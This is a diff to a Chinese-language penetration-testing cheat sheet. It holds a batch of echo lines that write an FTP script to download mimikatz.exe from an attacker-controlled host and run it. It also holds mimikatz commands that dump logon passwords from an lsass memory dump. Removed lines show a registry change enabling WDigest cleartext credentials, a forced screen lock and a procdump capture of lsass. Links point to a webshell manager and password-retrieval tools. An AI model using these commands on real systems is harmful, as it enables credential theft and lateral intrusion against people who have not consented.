@@ -39,8 +39,14 @@ permitrootlogin yes
 
 ```
 service vsftpd start/restart/stop     #开启/重启/停止ftp服务
-/home/ftp                             #文件存放路径
 username:anonymous password:null	  #匿名登录
+------------------------------------
+open                #连接FTP服务器
+get                 #下载指定文件
+put                 #上传指定文件
+delete              #删除FTP上文件
+m***                #处理一批文件
+hash                #显示下载进度
 ------------------------------------
 echo open 192.168.253.139 21>ftp.txt
 echo ftp>>ftp.txt
@@ -48,7 +54,6 @@ echo 123456>>ftp.txt
 echo bin>>ftp.txt
 echo get mimikatz.exe>>ftp.txt
 echo bye>>ftp.txt
-------------------------------------
 ftp -s:ftp.txt
 ```
 
@@ -422,10 +427,11 @@ B：ncat -nv IP 地址 端口 --ssl
 privilege::debug
 sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords full
--------------------------------------------------------------------------------------
-#修改注册表开启/关闭Wdigest Auth
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
-rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
-procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
 ```
+
+## Expand
+
+- [中国蚁剑](https://github.com/AntSwordProject/AntSword-Loader)
+- [Linux 枚举和提权检查](https://github.com/rebootuser/LinEnum)
+- [web 密码检索](https://github.com/djhohnstein/SharpWeb)
+- [密码检索工具](https://github.com/AlessandroZ/LaZagne)
